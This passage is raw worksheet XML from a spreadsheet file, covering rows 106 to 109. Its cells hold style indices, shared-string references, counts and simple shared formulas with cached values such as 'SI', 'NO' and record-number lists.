      <c r="KH106" s="40"/>
      <c r="KI106" s="40"/>
      <c r="KJ106" s="40"/>
      <c r="KK106" s="40"/>
      <c r="KL106" s="40"/>
      <c r="KM106" s="40"/>
      <c r="KN106" s="40"/>
      <c r="KO106" s="40"/>
      <c r="KP106" s="40"/>
      <c r="KQ106" s="40"/>
      <c r="KR106" s="40"/>
      <c r="KS106" s="40"/>
      <c r="KT106" s="40"/>
      <c r="KU106" s="40"/>
      <c r="KV106" s="40"/>
      <c r="KW106" s="40"/>
      <c r="KX106" s="40"/>
      <c r="KY106" s="40"/>
      <c r="KZ106" s="40"/>
      <c r="LA106" s="40"/>
      <c r="LB106" s="40"/>
      <c r="LC106" s="40"/>
      <c r="LD106" s="40"/>
      <c r="LE106" s="40"/>
      <c r="LF106" s="40"/>
      <c r="LG106" s="40"/>
      <c r="LH106" s="40"/>
      <c r="LI106" s="40"/>
    </row>
    <row r="107" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B107" s="224" t="s">
        <v>211</v>
      </c>
      <c r="C107" s="225" t="s">
        <v>375</v>
      </c>
      <c r="D107" s="225" t="s">
        <v>212</v>
      </c>
      <c r="E107" s="225" t="s">
        <v>1586</v>
      </c>
      <c r="F107" s="225">
        <v>53</v>
      </c>
      <c r="G107" s="225" t="s">
        <v>1587</v>
      </c>
      <c r="H107" s="226" t="s">
        <v>1588</v>
      </c>
      <c r="I107" s="225"/>
      <c r="J107" s="225" t="s">
        <v>1589</v>
      </c>
      <c r="K107" s="227" t="s">
        <v>1634</v>
      </c>
      <c r="L107" s="237" t="s">
        <v>1405</v>
      </c>
      <c r="M107" s="227" t="s">
        <v>501</v>
      </c>
      <c r="N107" s="227" t="s">
        <v>1642</v>
      </c>
      <c r="O107" s="389"/>
      <c r="P107" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q107" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R107" s="225"/>
      <c r="S107" s="396"/>
      <c r="T107" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U107" s="230" t="s">
        <v>428</v>
      </c>
      <c r="V107" s="231" t="s">
        <v>2603</v>
      </c>
      <c r="W107" s="231"/>
      <c r="X107" s="232" t="s">
        <v>192</v>
      </c>
      <c r="Y107" s="255" t="s">
        <v>186</v>
      </c>
      <c r="Z107" s="256" t="s">
        <v>2507</v>
      </c>
      <c r="AA107" s="257" t="s">
        <v>2410</v>
      </c>
      <c r="AB107" s="256" t="s">
        <v>2505</v>
      </c>
      <c r="AC107" s="226" t="s">
        <v>1643</v>
      </c>
      <c r="AD107" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE107" s="259" t="s">
        <v>1640</v>
      </c>
      <c r="AF107" s="270" t="s">
        <v>1644</v>
      </c>
      <c r="AG107" s="225" t="s">
        <v>1645</v>
      </c>
      <c r="AH107" s="271" t="s">
        <v>1646</v>
      </c>
      <c r="AI107" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ107" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK107" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL107" s="229" t="s">
        <v>403</v>
      </c>
      <c r="AM107" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN107" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO107" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP107" s="230"/>
      <c r="AQ107" s="230"/>
      <c r="AR107" s="288">
        <v>0</v>
      </c>
      <c r="AS107" s="288">
        <v>1</v>
      </c>
      <c r="AT107" s="288">
        <v>0</v>
      </c>
      <c r="AU107" s="288">
        <f t="shared" si="24"/>
        <v>1</v>
      </c>
      <c r="AV107" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW107" s="288">
        <v>2</v>
      </c>
      <c r="AX107" s="288">
        <v>2</v>
      </c>
      <c r="AY107" s="288">
        <v>0</v>
      </c>
      <c r="AZ107" s="288">
        <f t="shared" si="34"/>
        <v>2</v>
      </c>
      <c r="BA107" s="289"/>
      <c r="BB107" s="301">
        <v>0</v>
      </c>
      <c r="BC107" s="302">
        <v>0</v>
      </c>
      <c r="BD107" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BE107" s="302">
        <v>0</v>
      </c>
      <c r="BF107" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG107" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BH107" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI107" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ107" s="302" t="str">
        <f t="shared" si="25"/>
        <v>-, -</v>
      </c>
      <c r="BK107" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL107" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM107" s="302">
        <v>0</v>
      </c>
      <c r="BN107" s="304">
        <v>0</v>
      </c>
      <c r="BO107" s="304">
        <v>0</v>
      </c>
      <c r="BP107" s="304">
        <v>0</v>
      </c>
      <c r="BQ107" s="304">
        <v>0</v>
      </c>
      <c r="BR107" s="304">
        <f t="shared" si="26"/>
        <v>0</v>
      </c>
      <c r="BS107" s="304">
        <v>0</v>
      </c>
      <c r="BT107" s="304">
        <v>0</v>
      </c>
      <c r="BU107" s="304">
        <v>0</v>
      </c>
      <c r="BV107" s="305">
        <v>0</v>
      </c>
      <c r="BW107" s="317">
        <v>0</v>
      </c>
      <c r="BX107" s="318">
        <v>0</v>
      </c>
      <c r="BY107" s="318" t="s">
        <v>12</v>
      </c>
      <c r="BZ107" s="318">
        <v>0</v>
      </c>
      <c r="CA107" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB107" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CC107" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD107" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CE107" s="318" t="str">
        <f t="shared" si="27"/>
        <v>-, -</v>
      </c>
      <c r="CF107" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG107" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH107" s="318">
        <v>0</v>
      </c>
      <c r="CI107" s="319">
        <v>0</v>
      </c>
      <c r="CJ107" s="319">
        <v>0</v>
      </c>
      <c r="CK107" s="319">
        <v>0</v>
      </c>
      <c r="CL107" s="319">
        <v>0</v>
      </c>
      <c r="CM107" s="319">
        <f t="shared" si="28"/>
        <v>0</v>
      </c>
      <c r="CN107" s="319">
        <v>0</v>
      </c>
      <c r="CO107" s="319">
        <v>0</v>
      </c>
      <c r="CP107" s="319">
        <v>0</v>
      </c>
      <c r="CQ107" s="319">
        <v>0</v>
      </c>
      <c r="CR107" s="319">
        <v>0</v>
      </c>
      <c r="CS107" s="320">
        <v>0</v>
      </c>
      <c r="CT107" s="339">
        <v>0</v>
      </c>
      <c r="CU107" s="340">
        <v>0</v>
      </c>
      <c r="CV107" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CW107" s="340">
        <v>0</v>
      </c>
      <c r="CX107" s="340"/>
      <c r="CY107" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CZ107" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA107" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB107" s="340" t="str">
        <f t="shared" si="29"/>
        <v>-, -</v>
      </c>
      <c r="DC107" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD107" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE107" s="340">
        <v>0</v>
      </c>
      <c r="DF107" s="341">
        <v>0</v>
      </c>
      <c r="DG107" s="341">
        <v>0</v>
      </c>
      <c r="DH107" s="341">
        <v>0</v>
      </c>
      <c r="DI107" s="341">
        <v>0</v>
      </c>
      <c r="DJ107" s="341">
        <f t="shared" si="30"/>
        <v>0</v>
      </c>
      <c r="DK107" s="341">
        <v>0</v>
      </c>
      <c r="DL107" s="341">
        <v>0</v>
      </c>
      <c r="DM107" s="341">
        <v>0</v>
      </c>
      <c r="DN107" s="341">
        <v>0</v>
      </c>
      <c r="DO107" s="341">
        <v>0</v>
      </c>
      <c r="DP107" s="342">
        <v>0</v>
      </c>
      <c r="DQ107" s="355" t="s">
        <v>12</v>
      </c>
      <c r="DR107" s="356">
        <v>0</v>
      </c>
      <c r="DS107" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DT107" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DU107" s="356"/>
      <c r="DV107" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DW107" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX107" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DY107" s="356" t="str">
        <f t="shared" si="31"/>
        <v>-, -</v>
      </c>
      <c r="DZ107" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA107" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB107" s="356">
        <v>0</v>
      </c>
      <c r="EC107" s="357">
        <v>0</v>
      </c>
      <c r="ED107" s="357">
        <v>0</v>
      </c>
      <c r="EE107" s="357">
        <v>0</v>
      </c>
      <c r="EF107" s="357">
        <v>0</v>
      </c>
      <c r="EG107" s="357">
        <f t="shared" si="32"/>
        <v>0</v>
      </c>
      <c r="EH107" s="357">
        <v>0</v>
      </c>
      <c r="EI107" s="357">
        <v>0</v>
      </c>
      <c r="EJ107" s="357">
        <v>0</v>
      </c>
      <c r="EK107" s="357">
        <v>0</v>
      </c>
      <c r="EL107" s="357">
        <v>0</v>
      </c>
      <c r="EM107" s="358">
        <v>0</v>
      </c>
      <c r="EN107" s="368" t="str">
        <f t="shared" si="35"/>
        <v>NO</v>
      </c>
      <c r="EO107" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP107" s="369"/>
      <c r="EQ107" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER107" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES107" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET107" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU107" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV107" s="369"/>
      <c r="EW107" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX107" s="369"/>
      <c r="EY107" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ107" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA107" s="369"/>
      <c r="FB107" s="369"/>
      <c r="FC107" s="369">
        <v>0</v>
      </c>
      <c r="FD107" s="369">
        <f t="shared" si="15"/>
        <v>0</v>
      </c>
      <c r="FE107" s="369">
        <v>0</v>
      </c>
      <c r="FF107" s="369">
        <v>0</v>
      </c>
      <c r="FG107" s="369">
        <v>0</v>
      </c>
      <c r="FH107" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI107" s="377" t="str">
        <f t="shared" si="36"/>
        <v>NO</v>
      </c>
      <c r="FJ107" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FK107" s="378"/>
      <c r="FL107" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FM107" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FN107" s="378"/>
      <c r="FO107" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP107" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ107" s="378"/>
      <c r="FR107" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS107" s="380"/>
      <c r="FT107" s="380"/>
      <c r="FU107" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV107" s="378"/>
      <c r="FW107" s="378"/>
      <c r="FX107" s="378">
        <v>150</v>
      </c>
      <c r="FY107" s="378">
        <f t="shared" si="33"/>
        <v>0</v>
      </c>
      <c r="FZ107" s="378">
        <v>0</v>
      </c>
      <c r="GA107" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB107" s="378">
        <v>0</v>
      </c>
      <c r="GC107" s="379" t="s">
        <v>12</v>
      </c>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c r="IW107" s="40"/>
      <c r="IX107" s="40"/>
      <c r="IY107" s="40"/>
      <c r="IZ107" s="40"/>
      <c r="JA107" s="40"/>
      <c r="JB107" s="40"/>
      <c r="JC107" s="40"/>
      <c r="JD107" s="40"/>
      <c r="JE107" s="40"/>
      <c r="JF107" s="40"/>
      <c r="JG107" s="40"/>
      <c r="JH107" s="40"/>
      <c r="JI107" s="40"/>
      <c r="JJ107" s="40"/>
      <c r="JK107" s="40"/>
      <c r="JL107" s="40"/>
      <c r="JM107" s="40"/>
      <c r="JN107" s="40"/>
      <c r="JO107" s="40"/>
      <c r="JP107" s="40"/>
      <c r="JQ107" s="40"/>
      <c r="JR107" s="40"/>
      <c r="JS107" s="40"/>
      <c r="JT107" s="40"/>
      <c r="JU107" s="40"/>
      <c r="JV107" s="40"/>
      <c r="JW107" s="40"/>
      <c r="JX107" s="40"/>
      <c r="JY107" s="40"/>
      <c r="JZ107" s="40"/>
      <c r="KA107" s="40"/>
      <c r="KB107" s="40"/>
      <c r="KC107" s="40"/>
      <c r="KD107" s="40"/>
      <c r="KE107" s="40"/>
      <c r="KF107" s="40"/>
      <c r="KG107" s="40"/>
      <c r="KH107" s="40"/>
      <c r="KI107" s="40"/>
      <c r="KJ107" s="40"/>
      <c r="KK107" s="40"/>
      <c r="KL107" s="40"/>
      <c r="KM107" s="40"/>
      <c r="KN107" s="40"/>
      <c r="KO107" s="40"/>
      <c r="KP107" s="40"/>
      <c r="KQ107" s="40"/>
      <c r="KR107" s="40"/>
      <c r="KS107" s="40"/>
      <c r="KT107" s="40"/>
      <c r="KU107" s="40"/>
      <c r="KV107" s="40"/>
      <c r="KW107" s="40"/>
      <c r="KX107" s="40"/>
      <c r="KY107" s="40"/>
      <c r="KZ107" s="40"/>
      <c r="LA107" s="40"/>
      <c r="LB107" s="40"/>
      <c r="LC107" s="40"/>
      <c r="LD107" s="40"/>
      <c r="LE107" s="40"/>
      <c r="LF107" s="40"/>
      <c r="LG107" s="40"/>
      <c r="LH107" s="40"/>
      <c r="LI107" s="40"/>
    </row>
    <row r="108" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B108" s="224" t="s">
        <v>311</v>
      </c>
      <c r="C108" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D108" s="225" t="s">
        <v>312</v>
      </c>
      <c r="E108" s="225" t="s">
        <v>1647</v>
      </c>
      <c r="F108" s="225">
        <v>54</v>
      </c>
      <c r="G108" s="225" t="s">
        <v>1648</v>
      </c>
      <c r="H108" s="225" t="s">
        <v>1649</v>
      </c>
      <c r="I108" s="225"/>
      <c r="J108" s="225" t="s">
        <v>1650</v>
      </c>
      <c r="K108" s="227" t="s">
        <v>1651</v>
      </c>
      <c r="L108" s="228" t="s">
        <v>1034</v>
      </c>
      <c r="M108" s="227" t="s">
        <v>1652</v>
      </c>
      <c r="N108" s="227" t="s">
        <v>1653</v>
      </c>
      <c r="O108" s="389" t="s">
        <v>2745</v>
      </c>
      <c r="P108" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q108" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R108" s="225"/>
      <c r="S108" s="396"/>
      <c r="T108" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U108" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V108" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W108" s="231"/>
      <c r="X108" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y108" s="255" t="s">
        <v>191</v>
      </c>
      <c r="Z108" s="256" t="s">
        <v>1654</v>
      </c>
      <c r="AA108" s="257" t="s">
        <v>2413</v>
      </c>
      <c r="AB108" s="256" t="s">
        <v>2502</v>
      </c>
      <c r="AC108" s="226" t="s">
        <v>1655</v>
      </c>
      <c r="AD108" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE108" s="259" t="s">
        <v>1659</v>
      </c>
      <c r="AF108" s="270" t="s">
        <v>1656</v>
      </c>
      <c r="AG108" s="225" t="s">
        <v>1657</v>
      </c>
      <c r="AH108" s="273" t="s">
        <v>1658</v>
      </c>
      <c r="AI108" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ108" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK108" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL108" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM108" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN108" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO108" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP108" s="230"/>
      <c r="AQ108" s="230"/>
      <c r="AR108" s="288">
        <v>113</v>
      </c>
      <c r="AS108" s="288">
        <v>2</v>
      </c>
      <c r="AT108" s="288">
        <v>0</v>
      </c>
      <c r="AU108" s="288">
        <f t="shared" si="24"/>
        <v>2</v>
      </c>
      <c r="AV108" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW108" s="288">
        <v>2</v>
      </c>
      <c r="AX108" s="288">
        <v>2</v>
      </c>
      <c r="AY108" s="288">
        <v>0</v>
      </c>
      <c r="AZ108" s="288">
        <f t="shared" si="34"/>
        <v>2</v>
      </c>
      <c r="BA108" s="289" t="s">
        <v>1668</v>
      </c>
      <c r="BB108" s="301">
        <v>23</v>
      </c>
      <c r="BC108" s="302">
        <v>0</v>
      </c>
      <c r="BD108" s="302" t="s">
        <v>1660</v>
      </c>
      <c r="BE108" s="302">
        <v>2</v>
      </c>
      <c r="BF108" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG108" s="302" t="s">
        <v>1660</v>
      </c>
      <c r="BH108" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI108" s="302" t="s">
        <v>1660</v>
      </c>
      <c r="BJ108" s="302" t="str">
        <f t="shared" si="25"/>
        <v>-, -</v>
      </c>
      <c r="BK108" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL108" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM108" s="302">
        <v>0</v>
      </c>
      <c r="BN108" s="304">
        <v>112</v>
      </c>
      <c r="BO108" s="304">
        <v>18</v>
      </c>
      <c r="BP108" s="304">
        <v>0</v>
      </c>
      <c r="BQ108" s="304">
        <v>0</v>
      </c>
      <c r="BR108" s="304">
        <f t="shared" si="26"/>
        <v>0</v>
      </c>
      <c r="BS108" s="304">
        <v>23</v>
      </c>
      <c r="BT108" s="304">
        <v>0</v>
      </c>
      <c r="BU108" s="304">
        <v>23</v>
      </c>
      <c r="BV108" s="305">
        <v>0</v>
      </c>
      <c r="BW108" s="317">
        <v>41</v>
      </c>
      <c r="BX108" s="322">
        <v>1</v>
      </c>
      <c r="BY108" s="318" t="s">
        <v>1661</v>
      </c>
      <c r="BZ108" s="318">
        <v>4</v>
      </c>
      <c r="CA108" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB108" s="318" t="s">
        <v>1662</v>
      </c>
      <c r="CC108" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD108" s="318" t="s">
        <v>1662</v>
      </c>
      <c r="CE108" s="318" t="str">
        <f t="shared" si="27"/>
        <v>2027413, -</v>
      </c>
      <c r="CF108" s="318">
        <v>2027413</v>
      </c>
      <c r="CG108" s="322" t="s">
        <v>12</v>
      </c>
      <c r="CH108" s="322">
        <v>1</v>
      </c>
      <c r="CI108" s="319">
        <v>110</v>
      </c>
      <c r="CJ108" s="319">
        <v>18</v>
      </c>
      <c r="CK108" s="319">
        <v>1</v>
      </c>
      <c r="CL108" s="319">
        <v>0</v>
      </c>
      <c r="CM108" s="319">
        <f t="shared" si="28"/>
        <v>1</v>
      </c>
      <c r="CN108" s="319">
        <v>40</v>
      </c>
      <c r="CO108" s="319">
        <v>1</v>
      </c>
      <c r="CP108" s="319">
        <v>23</v>
      </c>
      <c r="CQ108" s="319">
        <v>18</v>
      </c>
      <c r="CR108" s="319">
        <v>40</v>
      </c>
      <c r="CS108" s="320">
        <v>1</v>
      </c>
      <c r="CT108" s="339">
        <v>47</v>
      </c>
      <c r="CU108" s="340">
        <v>1</v>
      </c>
      <c r="CV108" s="340" t="s">
        <v>1663</v>
      </c>
      <c r="CW108" s="340">
        <v>10</v>
      </c>
      <c r="CX108" s="340"/>
      <c r="CY108" s="340" t="s">
        <v>1664</v>
      </c>
      <c r="CZ108" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA108" s="340" t="s">
        <v>1664</v>
      </c>
      <c r="DB108" s="340" t="str">
        <f t="shared" si="29"/>
        <v>2027413, -</v>
      </c>
      <c r="DC108" s="340">
        <v>2027413</v>
      </c>
      <c r="DD108" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE108" s="340">
        <v>1</v>
      </c>
      <c r="DF108" s="341">
        <v>112</v>
      </c>
      <c r="DG108" s="341">
        <v>20</v>
      </c>
      <c r="DH108" s="341">
        <v>1</v>
      </c>
      <c r="DI108" s="341">
        <v>0</v>
      </c>
      <c r="DJ108" s="341">
        <f t="shared" si="30"/>
        <v>1</v>
      </c>
      <c r="DK108" s="341">
        <v>43</v>
      </c>
      <c r="DL108" s="341">
        <v>1</v>
      </c>
      <c r="DM108" s="341">
        <v>29</v>
      </c>
      <c r="DN108" s="341">
        <v>18</v>
      </c>
      <c r="DO108" s="341">
        <v>46</v>
      </c>
      <c r="DP108" s="342">
        <v>1</v>
      </c>
      <c r="DQ108" s="355">
        <v>141</v>
      </c>
      <c r="DR108" s="356">
        <v>2</v>
      </c>
      <c r="DS108" s="356" t="s">
        <v>1665</v>
      </c>
      <c r="DT108" s="356">
        <v>22</v>
      </c>
      <c r="DU108" s="356"/>
      <c r="DV108" s="356" t="s">
        <v>1666</v>
      </c>
      <c r="DW108" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX108" s="356" t="s">
        <v>1666</v>
      </c>
      <c r="DY108" s="356" t="str">
        <f t="shared" si="31"/>
        <v>2027413, 2034857, -</v>
      </c>
      <c r="DZ108" s="356" t="s">
        <v>1667</v>
      </c>
      <c r="EA108" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB108" s="356">
        <v>2</v>
      </c>
      <c r="EC108" s="357">
        <v>110</v>
      </c>
      <c r="ED108" s="357">
        <v>27</v>
      </c>
      <c r="EE108" s="357">
        <v>2</v>
      </c>
      <c r="EF108" s="357">
        <v>0</v>
      </c>
      <c r="EG108" s="357">
        <f t="shared" si="32"/>
        <v>2</v>
      </c>
      <c r="EH108" s="357">
        <v>65</v>
      </c>
      <c r="EI108" s="357">
        <v>2</v>
      </c>
      <c r="EJ108" s="357">
        <v>29</v>
      </c>
      <c r="EK108" s="357">
        <v>112</v>
      </c>
      <c r="EL108" s="357">
        <v>140</v>
      </c>
      <c r="EM108" s="358">
        <v>2</v>
      </c>
      <c r="EN108" s="368" t="str">
        <f t="shared" si="35"/>
        <v>SI</v>
      </c>
      <c r="EO108" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP108" s="369"/>
      <c r="EQ108" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER108" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES108" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET108" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU108" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV108" s="369"/>
      <c r="EW108" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX108" s="369"/>
      <c r="EY108" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ108" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA108" s="369"/>
      <c r="FB108" s="369"/>
      <c r="FC108" s="369">
        <v>14</v>
      </c>
      <c r="FD108" s="369">
        <f t="shared" si="15"/>
        <v>0</v>
      </c>
      <c r="FE108" s="369">
        <v>0</v>
      </c>
      <c r="FF108" s="369">
        <v>0</v>
      </c>
      <c r="FG108" s="369">
        <v>0</v>
      </c>
      <c r="FH108" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI108" s="377" t="str">
        <f t="shared" si="36"/>
        <v>SI</v>
      </c>
      <c r="FJ108" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FK108" s="378"/>
      <c r="FL108" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FM108" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FN108" s="378"/>
      <c r="FO108" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP108" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ108" s="378"/>
      <c r="FR108" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS108" s="380"/>
      <c r="FT108" s="380"/>
      <c r="FU108" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV108" s="378"/>
      <c r="FW108" s="378"/>
      <c r="FX108" s="378">
        <v>3</v>
      </c>
      <c r="FY108" s="378">
        <f t="shared" si="33"/>
        <v>0</v>
      </c>
      <c r="FZ108" s="378">
        <v>0</v>
      </c>
      <c r="GA108" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB108" s="378">
        <v>0</v>
      </c>
      <c r="GC108" s="379" t="s">
        <v>12</v>
      </c>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c r="IW108" s="40"/>
      <c r="IX108" s="40"/>
      <c r="IY108" s="40"/>
      <c r="IZ108" s="40"/>
      <c r="JA108" s="40"/>
      <c r="JB108" s="40"/>
      <c r="JC108" s="40"/>
      <c r="JD108" s="40"/>
      <c r="JE108" s="40"/>
      <c r="JF108" s="40"/>
      <c r="JG108" s="40"/>
      <c r="JH108" s="40"/>
      <c r="JI108" s="40"/>
      <c r="JJ108" s="40"/>
      <c r="JK108" s="40"/>
      <c r="JL108" s="40"/>
      <c r="JM108" s="40"/>
      <c r="JN108" s="40"/>
      <c r="JO108" s="40"/>
      <c r="JP108" s="40"/>
      <c r="JQ108" s="40"/>
      <c r="JR108" s="40"/>
      <c r="JS108" s="40"/>
      <c r="JT108" s="40"/>
      <c r="JU108" s="40"/>
      <c r="JV108" s="40"/>
      <c r="JW108" s="40"/>
      <c r="JX108" s="40"/>
      <c r="JY108" s="40"/>
      <c r="JZ108" s="40"/>
      <c r="KA108" s="40"/>
      <c r="KB108" s="40"/>
      <c r="KC108" s="40"/>
      <c r="KD108" s="40"/>
      <c r="KE108" s="40"/>
      <c r="KF108" s="40"/>
      <c r="KG108" s="40"/>
      <c r="KH108" s="40"/>
      <c r="KI108" s="40"/>
      <c r="KJ108" s="40"/>
      <c r="KK108" s="40"/>
      <c r="KL108" s="40"/>
      <c r="KM108" s="40"/>
      <c r="KN108" s="40"/>
      <c r="KO108" s="40"/>
      <c r="KP108" s="40"/>
      <c r="KQ108" s="40"/>
      <c r="KR108" s="40"/>
      <c r="KS108" s="40"/>
      <c r="KT108" s="40"/>
      <c r="KU108" s="40"/>
      <c r="KV108" s="40"/>
      <c r="KW108" s="40"/>
      <c r="KX108" s="40"/>
      <c r="KY108" s="40"/>
      <c r="KZ108" s="40"/>
      <c r="LA108" s="40"/>
      <c r="LB108" s="40"/>
      <c r="LC108" s="40"/>
      <c r="LD108" s="40"/>
      <c r="LE108" s="40"/>
      <c r="LF108" s="40"/>
      <c r="LG108" s="40"/>
      <c r="LH108" s="40"/>
      <c r="LI108" s="40"/>
    </row>
    <row r="109" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B109" s="224" t="s">
        <v>1247</v>
      </c>
      <c r="C109" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D109" s="225" t="s">
        <v>177</v>
      </c>
      <c r="E109" s="225" t="s">
        <v>1669</v>
      </c>
      <c r="F109" s="233">
        <v>55</v>
      </c>
      <c r="G109" s="225" t="s">
        <v>1670</v>
      </c>
      <c r="H109" s="225" t="s">
        <v>1671</v>
      </c>
      <c r="I109" s="233"/>
      <c r="J109" s="225" t="s">
        <v>1672</v>
      </c>
      <c r="K109" s="227" t="s">
        <v>946</v>
      </c>
      <c r="L109" s="228" t="s">
        <v>329</v>
      </c>
      <c r="M109" s="227" t="s">
        <v>964</v>
      </c>
      <c r="N109" s="227" t="s">
        <v>1673</v>
      </c>
      <c r="O109" s="389" t="s">
        <v>2746</v>
      </c>
      <c r="P109" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q109" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R109" s="238" t="s">
        <v>2595</v>
      </c>
      <c r="S109" s="399" t="s">
        <v>2595</v>
      </c>
      <c r="T109" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U109" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V109" s="234" t="s">
        <v>2596</v>
      </c>
      <c r="W109" s="234"/>
      <c r="X109" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y109" s="255" t="s">
        <v>191</v>
      </c>
      <c r="Z109" s="256" t="s">
        <v>1166</v>
      </c>
      <c r="AA109" s="257" t="s">
        <v>2410</v>
      </c>
      <c r="AB109" s="256" t="s">
        <v>2495</v>
      </c>
      <c r="AC109" s="226" t="s">
        <v>1674</v>
      </c>
      <c r="AD109" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE109" s="259" t="s">
        <v>951</v>
      </c>
      <c r="AF109" s="270" t="s">
        <v>1675</v>
      </c>
      <c r="AG109" s="225" t="s">
        <v>1676</v>
      </c>
      <c r="AH109" s="271" t="s">
        <v>1677</v>
      </c>
      <c r="AI109" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ109" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK109" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL109" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM109" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN109" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO109" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP109" s="230"/>
      <c r="AQ109" s="230"/>
      <c r="AR109" s="288">
        <v>11</v>
      </c>
      <c r="AS109" s="288">
        <v>1</v>
      </c>
      <c r="AT109" s="288">
        <v>0</v>
